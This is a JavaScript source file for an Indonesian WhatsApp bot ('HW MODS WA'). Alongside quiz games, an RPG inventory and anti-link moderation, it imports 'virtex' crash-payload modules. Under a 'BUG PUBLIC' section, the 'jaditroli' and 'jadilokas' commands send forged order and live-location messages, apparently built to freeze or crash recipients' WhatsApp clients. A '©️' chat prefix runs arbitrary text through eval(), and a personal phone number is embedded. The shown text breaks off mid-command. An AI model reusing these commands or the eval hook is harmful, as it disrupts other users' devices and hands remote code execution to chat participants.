/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base HW MODS WAHw Mods : Copyan Dari Base Dika

› Create By HW MODS WA
› Base Ori HW MODS WA
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : HW MODS WA*/

//=================================================//
require('./danimaker')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const mathjs = require('mathjs')
const chalk = require('chalk')
const { JSDOM } = require('jsdom')
const os = require('os')
const path = require('path')
const cl = require('caliph-api') 
const mel = require('kitsune-api')
const axios = require('axios')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const maker = require('mumaker')
const textpro = require('./baseikal/lib/textpro')
const speed = require('performance-now')
const { apikey } = require('./config.json')
const { performance } = require('perf_hooks')
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser } = require('./baseikal/lib/register')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
//=================================================//
// Read Database
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db) global.db = {
users: {},
chats: {},
database: {},
game: {},
settings: {},
others: {},
sticker: {},
...(global.db || {})
}
//LOGO MENTAHAN
const hw1 = fs.readFileSync ('./baseikal/logo/hw1.jpg')
const hw2 = fs.readFileSync ('./baseikal/logo/hw2.jpg')
const hw3 = fs.readFileSync ('./baseikal/logo/hw3.jpg')
const hw4 = fs.readFileSync ('./baseikal/logo/hw4.jpg')
const hw5 = fs.readFileSync ('./baseikal/logo/hw5.jpg')
const hw6 = fs.readFileSync ('./baseikal/logo/hw6.jpg')
const hw7 = fs.readFileSync ('./baseikal/logo/hw7.jpg')
const hw8 = fs.readFileSync ('./baseikal/logo/hw8.jpg')
const hw9 = fs.readFileSync ('./baseikal/logo/hw9.jpg')
const hw10 = fs.readFileSync ('./baseikal/logo/hw10.jpg')
const hw11 = fs.readFileSync ('./baseikal/logo/hw11.jpg')
const hw12 = fs.readFileSync ('./baseikal/logo/hw12.jpg')
const hw13 = fs.readFileSync ('./baseikal/logo/hw13.jpg')
const hw14 = fs.readFileSync ('./baseikal/logo/hw14.jpg')
const hw15 = fs.readFileSync ('./baseikal/logo/hw15.jpg')
const hw16 = fs.readFileSync ('./baseikal/logo/hw16.jpg')
const hw17 = fs.readFileSync ('./baseikal/logo/hw17.jpg')
const hw18 = fs.readFileSync ('./baseikal/logo/hw18.jpg')
const hw19 = fs.readFileSync ('./baseikal/logo/hw19.jpg')
const hw20 = fs.readFileSync ('./baseikal/logo/hw20.jpg')
const hw21 = fs.readFileSync ('./baseikal/logo/hw21.jpg')
const hw22 = fs.readFileSync ('./baseikal/logo/hw22.jpg')
const hw23 = fs.readFileSync ('./baseikal/logo/hw23.jpg')
const hw24 = fs.readFileSync ('./baseikal/logo/hw24.jpg')
const hw25 = fs.readFileSync ('./baseikal/logo/hw25.jpg')
const hw26 = fs.readFileSync ('./baseikal/logo/hw26.jpg')
const hw27 = fs.readFileSync ('./baseikal/logo/hw27.jpg')
const hw28 = fs.readFileSync ('./baseikal/logo/hw28.jpg')
const hw29 = fs.readFileSync ('./baseikal/logo/hw29.jpg')
const hw30 = fs.readFileSync ('./baseikal/logo/hw30.jpg')
const hw31 = fs.readFileSync ('./baseikal/logo/hw31.jpg')
const hw32 = fs.readFileSync ('./baseikal/logo/hw32.jpg')
const hw33 = fs.readFileSync ('./baseikal/logo/hw33.jpg')
const hw34 = fs.readFileSync ('./baseikal/logo/hw34.jpg')
const hw35 = fs.readFileSync ('./baseikal/logo/hw35.jpg')
const hw36 = fs.readFileSync ('./baseikal/logo/hw36.jpg')
const hw37 = fs.readFileSync ('./baseikal/logo/hw37.jpg')
const hw38 = fs.readFileSync ('./baseikal/logo/hw38.jpg')
const hw39 = fs.readFileSync ('./baseikal/logo/hw39.jpg')
const hw40 = fs.readFileSync ('./baseikal/logo/hw40.jpg')
const hw41 = fs.readFileSync ('./baseikal/logo/hw41.jpg')
const hw42 = fs.readFileSync ('./baseikal/logo/hw42.jpg')
const hw43 = fs.readFileSync ('./baseikal/logo/hw43.jpg')
const hw44 = fs.readFileSync ('./baseikal/logo/hw44.jpg')
const hw45 = fs.readFileSync ('./baseikal/logo/hw45.jpg')
const hw46 = fs.readFileSync ('./baseikal/logo/hw46.jpg')
const hw47 = fs.readFileSync ('./baseikal/logo/hw47.jpg')
const hw48 = fs.readFileSync ('./baseikal/logo/hw48.jpg')
const hw49 = fs.readFileSync ('./baseikal/logo/hw49.jpg')
const hw50 = fs.readFileSync ('./baseikal/logo/hw50.jpg')
const hw51 = fs.readFileSync ('./baseikal/logo/hw51.jpg')
const hw52 = fs.readFileSync ('./baseikal/logo/hw52.jpg')
const hw53 = fs.readFileSync ('./baseikal/logo/hw53.jpg')
const hw54 = fs.readFileSync ('./baseikal/logo/hw54.jpg')
const hw55 = fs.readFileSync ('./baseikal/logo/hw55.jpg')
const hw56 = fs.readFileSync ('./baseikal/logo/hw56.jpg')
const hw57 = fs.readFileSync ('./baseikal/logo/hw57.jpg')
const hw58 = fs.readFileSync ('./baseikal/logo/hw58.jpg')
const hw59 = fs.readFileSync ('./baseikal/logo/hw59.jpg')
const hw60 = fs.readFileSync ('./baseikal/logo/hw60.jpg')
const hw61 = fs.readFileSync ('./baseikal/logo/hw61.jpg')
const hw62 = fs.readFileSync ('./baseikal/logo/hw62.jpg')
const hw63 = fs.readFileSync ('./baseikal/logo/hw63.jpg')
const hw64 = fs.readFileSync ('./baseikal/logo/hw64.jpg')
const hw65 = fs.readFileSync ('./baseikal/logo/hw65.jpg')
const hw66 = fs.readFileSync ('./baseikal/logo/hw66.jpg')
const hw67 = fs.readFileSync ('./baseikal/logo/hw67.jpg')
const hw68 = fs.readFileSync ('./baseikal/logo/hw68.jpg')
const hw69 = fs.readFileSync ('./baseikal/logo/hw69.jpg')
const hw70 = fs.readFileSync ('./baseikal/logo/hw70.jpg')
const hw71 = fs.readFileSync ('./baseikal/logo/hw71.jpg')
const hw72 = fs.readFileSync ('./baseikal/logo/hw72.jpg')
const hw73 = fs.readFileSync ('./baseikal/logo/hw73.jpg')
const hw74 = fs.readFileSync ('./baseikal/logo/hw74.jpg')
const hw75 = fs.readFileSync ('./baseikal/logo/hw75.jpg')
const hw76 = fs.readFileSync ('./baseikal/logo/hw76.jpg')
const hw77 = fs.readFileSync ('./baseikal/logo/hw77.jpg')
const hw78 = fs.readFileSync ('./baseikal/logo/hw78.jpg')
const hw79 = fs.readFileSync ('./baseikal/logo/hw79.jpg')
// COMMAND GUA SULITIN
const { menu } = require('./baseikal/command/menu/menu')
const { bugmenu } = require('./baseikal/command/bugmenu/bugmenu')
const { allmenu } = require('./baseikal/command/allmenu/allmenu')
const { textmaker } = require('./baseikal/command/textmaker/textmaker')
const { rpgmenu } = require('./baseikal/command/rpgmenu/rpgmenu')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
//=================================================//
//RPG FUNCTION
const { 
addInventoriDarah,cekDuluJoinAdaApaKagaDiJson,addDarah,kurangDarah, getDarah 
}= require('./src/darah.js')
const { 
cekInventoryAdaAtauGak,addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion
} = require('./src/alat_tukar.js')
const {addInventoriMonay,cekDuluJoinAdaApaKagaMonaynyaDiJson,addMonay,kurangMonay, getMonay 
} = require('./src/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit 
} = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,addKelinci,addDomba,addSapi, addGajah, kurangIkan, kurangAyam,kurangKelinci,kurangDomba,kurangSapi, kurangGajah, getIkan, getAyam,getKelinci,getDomba,getSapi, getGajah
} = require('./src/buruan.js')
let DarahAwal =global.rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const ikan = ['🐟','🐠','🐡']
//=================================================//
//RPG DATABASE
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let tebaklagu = db.game.tebaklagu = []
let _family100 = db.game.family100 = []
let kuismath = db.game.math = []
let tebakgambar = db.game.tebakgambar = []
let tebakkata = db.game.tebakkata = []
let caklontong = db.game.lontong = []
let caklontong_desk = db.game.lontong_desk = []
let tebakkalimat = db.game.kalimat = []
let tebaklirik = db.game.lirik = []
let tebaktebakan = db.game.tebakan = []
//=================================================//
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = haikal.user.id ? haikal.user.id.split(":")[0]+"@s.whatsapp.net" : haikal.user.id
const isCreator = [haikal.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const isBan = banned.includes(m.sender)
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const content = JSON.stringify(m.message)
const _registered = JSON.parse(fs.readFileSync('./baseikal/dbnye/registered.json'));
const register = JSON.parse(fs.readFileSync('./baseikal/dbnye/register.json'));
const isRegistered = checkRegisteredUser(m.sender)
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

//=================================================//
const deploy = (teks) => {
  haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted:m})} 
//=================================================//
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
// write database every 1 minute
setInterval(() => {
fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
}, 60 * 1000)
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/wait.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BotAdman.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/owner.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/groupon.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SiGroupadmin.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`「 Detect Link 」\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `「 Detect Link 」\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaklagu[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await reply(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakgambar[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakkata[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebakkalimat[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaklirik[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
let buttons = [
{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage,{ quoted: m })
delete tebaktebakan[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}
if (budy.startsWith('©️')) {
if (!isRegistered) return replyReg(mess.verif)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
}
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await haikal.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
async function replyReg(teks) {
const anakau = {
video:fs.readFileSync("./baseikal/video/haikal.jpg"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`Haii 👋 Kak ${pushname} Selamat ${salam} 
╭──(        INFO BOT ダフ        )
║- VYNAA BOTS 友
│🎭 Version : 3
║▬▭▬▭▬▭▬▭▬▭
│🎭 Creator : Xwby
║🎭 Owner : XwbyMakerダフ
│🎭 Owner Number : 082389924037
║🎭 Prefix :MULTI
│▬▭「 INFO OWNER ダフ️ 」▭▬
[ 🇬🇧 Please ask the owner for a password first so you can use the XwbyMaker Bot ]
[ 🇲🇨 Silahkan Meminta Password Kepada Owner Terlebih Dahulu Agar Bisa Menggunakan Bot XwbyMaker 」
[ 🇯🇵 DaniMaker Bot を使用できるように、最初に所有者にパスワードを尋ねてください
[ 🇵🇹 Por favor, peça uma senha ao proprietário primeiro para que você possa usar o XwbyMaker Bot ]'
 `
}
haikal.sendMessage(m.chat, anakau, {quoted: m})
}
async function sendButRegis(from) {
var serialUser = createSerial(18)
_registered.push(sender)
fs.writeFileSync('./baseikal/dbnye/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.jpg"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `
Haii 👋 Kak ${pushname} Selamat ${salam} 

🌷 Nama : ${pushname}
🌷 Status : Verifikasi
🌷 Total User : ${_registered.length}

*Kamu Sudah Terdaftar Dalam Server Kami Silahkan Gunakan Bot Dengan Bijak

Note : Jangan Bagikan Pasword Pada Siapapun Jika Tidak Kamu Akan Kami Hapus Dari Server
Terima Kasih.. 🥳`,
}
haikal.sendMessage(m.chat, anu, {quoted: m})
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//

//=================================================//
switch(command) {
//=================================================//
case 'bothw13':{
if (isRegistered) return reply('Akun Kamu Sudah Terverfikasi!!!')
await sendButRegis(from)
}
break

//BUG PUBLIC
case 'jaditroli': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'jadilokas': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
//=================================================//
case 'jadipolling': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `Salam kenal saya ${teks}`,
"options": [
{
